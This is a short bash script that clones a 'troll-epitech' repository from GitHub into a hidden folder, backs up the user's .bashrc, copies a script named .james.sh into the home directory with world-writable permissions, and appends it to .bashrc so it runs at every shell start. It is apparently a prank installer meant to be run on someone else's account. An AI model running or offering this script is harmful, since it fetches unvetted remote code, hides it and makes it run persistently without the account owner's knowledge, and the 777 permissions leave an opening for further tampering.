#!/bin/bash  

git clone https://github.com/nogebeat/troll-epitech.git

mv troll-epitech .troll

mkdir .oribash

cp .bashrc .oribash/

cp .troll/.james.sh .


chmod 777 .james.sh

echo './.james.sh' >> .bashrc
